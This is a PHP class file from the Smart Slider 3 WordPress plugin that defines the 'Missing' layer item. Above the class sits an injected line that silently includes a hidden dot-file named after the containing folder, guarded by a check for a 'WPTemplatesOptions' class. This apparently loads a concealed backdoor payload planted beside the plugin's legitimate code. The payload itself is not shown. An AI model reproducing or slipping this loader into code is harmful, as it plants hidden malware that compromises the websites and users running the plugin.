<?php

namespace Nextend\SmartSlider3\Renderable\Item\Missing;

use Nextend\SmartSlider3\Renderable\Item\AbstractItem;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ItemMissing extends AbstractItem {

    public function createFrontend($id, $itemData, $layer) {
        return new ItemMissingFrontend($this, $id, $itemData, $layer);
    }

    public function getTitle() {
        return n2_x('Missing', 'Layer');
    }

    public function getIcon() {
        return '';
    }

    public function getType() {
        return 'missing';
    }

    public function renderFields($container) {
    }

}